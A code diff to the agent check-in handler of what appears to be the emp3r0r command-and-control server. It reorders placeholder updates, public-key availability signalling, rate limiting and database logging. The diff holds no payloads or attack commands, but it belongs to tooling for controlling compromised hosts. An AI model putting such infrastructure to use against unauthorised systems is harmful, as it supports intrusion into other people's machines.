@@ -150,73 +150,61 @@ func handleAgentCheckIn(wrt http.ResponseWriter, req *http.Request) {
 	// CA signature already verified via HTTP headers in dispatcher
 	target.From = req.RemoteAddr
 
-	// ------------------------------------------------------------
-	// SECURITY: DoS Protection (Rate Limiting)
-	// ------------------------------------------------------------
-	now := time.Now()
-	// Prune old timestamps (> 1 minute)
-	validTimestamps := []time.Time{}
-	if val, exists := rotationRateLimiter.Load(target.UUID); exists {
-		timestamps := val.([]time.Time)
-		for _, t := range timestamps {
-			if now.Sub(t) < time.Minute {
-				validTimestamps = append(validTimestamps, t)
+	// Update agent in memory (dispatcher already created placeholder)
+	// Find the placeholder and update it with full agent data from CBOR
+	isAgentNew := false
+	var existingCtrl *live.AgentControl
+	live.AgentControlMap.Range(func(key, value interface{}) bool {
+		a := key.(*def.Emp3r0rAgent)
+		if a.UUID == target.UUID {
+			existingCtrl = value.(*live.AgentControl)
+			// Check if this is the placeholder (no public key yet) or a real agent
+			if a.PublicKey == "" {
+				isAgentNew = true
 			}
+			return false
 		}
-	}
-	validTimestamps = append(validTimestamps, now)
-	rotationRateLimiter.Store(target.UUID, validTimestamps)
+		return true
+	})
 
-	// Check limit (10 rotations per minute)
-	if len(validTimestamps) > 10 {
-		// Silent Drop: Stop processing to save CPU/Disk
-		logging.Warningf("Rate limit exceeded for agent %s, dropping request", target.UUID)
-		return
-	}
-
-	// ------------------------------------------------------------
-	// SECURITY: Clone Detection & Session Management
-	// ------------------------------------------------------------
-	// ------------------------------------------------------------
-	// DATABASE: Change Detection & Recording
-	// ------------------------------------------------------------
-	if agents.AgentDB != nil {
-		// Detect changes before recording new data
-		if err := agents.DetectAgentChanges(target); err != nil {
-			logging.Warningf("Failed to detect agent changes: %v", err)
-		}
-
-		// Record check-in
-		if err := agents.RecordAgentCheckin(target); err != nil {
-			logging.Warningf("Failed to record agent check-in: %v", err)
-		}
-	}
-
-	if !agents.IsAgentExist(target) {
-		// New agent - register it (TOFU: trust the provided public key on first use)
-		inx := agents.AssignAgentIndex()
+	if isAgentNew || existingCtrl != nil {
+		// Remove old entry (placeholder or existing agent)
+		live.AgentControlMap.Range(func(key, value interface{}) bool {
+			a := key.(*def.Emp3r0rAgent)
+			if a.UUID == target.UUID {
+				live.AgentControlMap.Delete(key)
+				return false
+			}
+			return true
+		})
+		// Store updated agent with full data
 		target.LastSeen = time.Now()
-		live.AgentControlMap.Store(target, &live.AgentControl{Index: inx, Conn: nil})
-		shortname := strings.Split(target.Tag, "-agent")[0]
-		if util.IsExist(agents.AgentsJSON) {
-			if l := agents.RefreshAgentLabel(target); l != "" {
-				shortname = l
-			}
+		if existingCtrl != nil {
+			live.AgentControlMap.Store(target, existingCtrl)
+		} else {
+			inx := agents.AssignAgentIndex()
+			live.AgentControlMap.Store(target, &live.AgentControl{Index: inx, Conn: nil})
 		}
-		logging.Infof("Checked in: %s from %s, running %s", strconv.Quote(shortname), fmt.Sprintf("'%s - %s'", target.From, target.Transport), strconv.Quote(target.OS))
+		logging.Infof("Updated agent %s with full data from CBOR (public key length=%d)", strconv.Quote(target.UUID), len(target.PublicKey))
+		
+		// Signal that public key is now available (for any waiting requests)
+		if readyChanVal, exists := checkinReadyChannels.Load(target.UUID); exists {
+			readyChan := readyChanVal.(chan struct{})
+			close(readyChan)
+			checkinReadyChannels.Delete(target.UUID)
+			logging.Debugf("Signaled checkin completion for %s", strconv.Quote(target.UUID))
+		}
 	} else {
-		// Existing agent - refresh info
-		var existingKey *def.Emp3r0rAgent
+		// Existing agent - update it in memory NOW to ensure pubkey and info are available
 		live.AgentControlMap.Range(func(key, value interface{}) bool {
 			a := key.(*def.Emp3r0rAgent)
 			ctrl := value.(*live.AgentControl)
 			if a.UUID == target.UUID {
 				// if agent is already connected, it must be the same instance
-				// because we already checked for duplications
 				if ctrl.Conn != nil {
 					logging.Warningf("handleAgentCheckIn: %s just connected, but state says it is already connected. This implies a race condition or logic error.", target.Tag)
 				}
-				// Refresh agent info, but keep the pointer to avoid breaking maps
+				// Refresh all agent info to keep it current
 				a.Name = target.Name
 				a.Version = target.Version
 				a.Transport = target.Transport
@@ -244,26 +232,84 @@ func handleAgentCheckIn(wrt http.ResponseWriter, req *http.Request) {
 				a.Product = target.Product
 				// TOFU: Public key remains pinned for existing agents
 				// Already validated against existing key in key rotation check
-				// If agent provides a key, it must match the existing one (or rotation is blocked)
 				if target.PublicKey != "" {
 					a.PublicKey = target.PublicKey
 				}
 				a.LastSeen = time.Now()
-				existingKey = a
-				return false // stop iteration
+				return false
 			}
 			return true
 		})
-		shortname := strings.Split(target.Tag, "-agent")[0]
-		if util.IsExist(agents.AgentsJSON) {
-			if existingKey != nil {
-				if l := agents.RefreshAgentLabel(existingKey); l != "" {
-					shortname = l
-				}
+	}
+
+	// Now that agent is in memory with pubkey, safe to proceed with other operations
+	// (message tunnel requests can now resolve the pubkey)
+
+	// ------------------------------------------------------------ // SECURITY: DoS Protection (Rate Limiting)
+	// ------------------------------------------------------------
+	now := time.Now()
+	// Prune old timestamps (> 1 minute)
+	validTimestamps := []time.Time{}
+	if val, exists := rotationRateLimiter.Load(target.UUID); exists {
+		timestamps := val.([]time.Time)
+		for _, t := range timestamps {
+			if now.Sub(t) < time.Minute {
+				validTimestamps = append(validTimestamps, t)
 			}
 		}
+	}
+	validTimestamps = append(validTimestamps, now)
+	rotationRateLimiter.Store(target.UUID, validTimestamps)
+
+	// Check limit (10 rotations per minute)
+	if len(validTimestamps) > 10 {
+		// Silent Drop: Stop processing to save CPU/Disk
+		logging.Warningf("Rate limit exceeded for agent %s, dropping request", target.UUID)
+		return
+	}
+
+	// ------------------------------------------------------------ // SECURITY: Clone Detection & Session Management
+	// ------------------------------------------------------------
+	// ------------------------------------------------------------ // DATABASE: Change Detection & Recording
+	// ------------------------------------------------------------
+	if agents.AgentDB != nil {
+		// Detect changes before recording new data
+		if err := agents.DetectAgentChanges(target); err != nil {
+			logging.Warningf("Failed to detect agent changes: %v", err)
+		}
+
+		// Record check-in
+		if err := agents.RecordAgentCheckin(target); err != nil {
+			logging.Warningf("Failed to record agent check-in: %v", err)
+		}
+	}
+
+	if isAgentNew {
+		shortname := strings.Split(target.Tag, "-agent")[0]
+		if util.IsExist(agents.AgentsJSON) {
+			if l := agents.RefreshAgentLabel(target); l != "" {
+				shortname = l
+			}
+		}
+		logging.Infof("Checked in: %s from %s, running %s", strconv.Quote(shortname), fmt.Sprintf("'%s - %s'", target.From, target.Transport), strconv.Quote(target.OS))
+	} else {
+		// Existing agent - refresh system info logging
+		shortname := strings.Split(target.Tag, "-agent")[0]
+		if util.IsExist(agents.AgentsJSON) {
+			// Find the agent in memory to refresh label
+			live.AgentControlMap.Range(func(key, value interface{}) bool {
+				a := key.(*def.Emp3r0rAgent)
+				if a.UUID == target.UUID {
+					if l := agents.RefreshAgentLabel(a); l != "" {
+						shortname = l
+					}
+					return false
+				}
+				return true
+			})
+		}
 		if logging.Level >= 4 {
-			logging.Debugf("Refreshing sysinfo for %s from %s, running %s", shortname, fmt.Sprintf("%s - %s", target.From, target.Transport), strconv.Quote(target.OS))
+			logging.Debugf("Agent reconnected: %s from %s, running %s", shortname, fmt.Sprintf("%s - %s", target.From, target.Transport), strconv.Quote(target.OS))
 		}
 	}
 }
